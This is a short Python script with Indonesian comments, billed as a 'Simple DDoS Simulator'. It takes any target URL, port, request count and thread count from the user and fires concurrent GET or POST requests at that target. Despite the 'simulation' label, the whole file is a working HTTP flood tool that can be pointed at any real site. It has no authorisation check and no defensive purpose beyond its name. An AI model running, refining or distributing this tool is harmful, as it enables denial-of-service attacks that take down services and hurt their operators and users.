import requests
import concurrent.futures
import time

# Nama Yetazyy
author = "Yetazyy"

# Fungsi untuk menampilkan banner
def display_banner():
    banner = f"""
    ***************************************
    *                                     *
    *         Simple DDoS Simulator       *
    *                                     *
    *  Author: {author}                   *
    *  Version: 1.0                       *
    *  Description: Simulasi DDoS Attack  *
    *               dengan Python.        *
    *                                     *
    ***************************************
    """
    print(banner)

# Fungsi untuk mengirim HTTP request
def send_request(url, method="GET"):
    try:
        if method.upper() == "GET":
            response = requests.get(url)
        elif method.upper() == "POST":
            response = requests.post(url)
        else:
            print(f"Metode {method} tidak didukung.")
            return

        print(f"Request {method} sent to {url}, Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send {method} request to {url}: {e}")

# Fungsi untuk mensimulasikan DDoS attack dengan concurrency
def ddos_attack(url, num_requests, method="GET", max_workers=10):
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Kirim request secara bersamaan
        futures = [executor.submit(send_request, url, method) for _ in range(num_requests)]
        
        # Tunggu semua request selesai
        for future in concurrent.futures.as_completed(futures):
            future.result()  # Handle exceptions jika ada

if __name__ == "__main__":
    # Tampilkan banner
    display_banner()

    # Input dari pengguna
    target_url = input("Masukkan URL target (contoh: https://example.com): ").strip()
    target_port = input("Masukkan port target (contoh: 443): ").strip()
    num_requests = int(input("Masukkan jumlah request yang ingin dikirim: ").strip())
    method = input("Masukkan metode HTTP (GET/POST): ").strip().upper()
    max_workers = int(input("Masukkan jumlah worker (concurrency): ").strip())

    # Validasi metode HTTP
    if method not in ["GET", "POST"]:
        print("Metode HTTP tidak valid. Menggunakan GET sebagai default.")
        method = "GET"

    # Gabungkan URL dan port
    if target_port:
        target_url = f"{target_url}:{target_port}"

    print("\nMemulai simulasi DDoS...")
    start_time = time.time()
    ddos_attack(target_url, num_requests, method, max_workers)
    end_time = time.time()
    print(f"\nSimulasi DDoS selesai dalam {end_time - start_time} detik.")
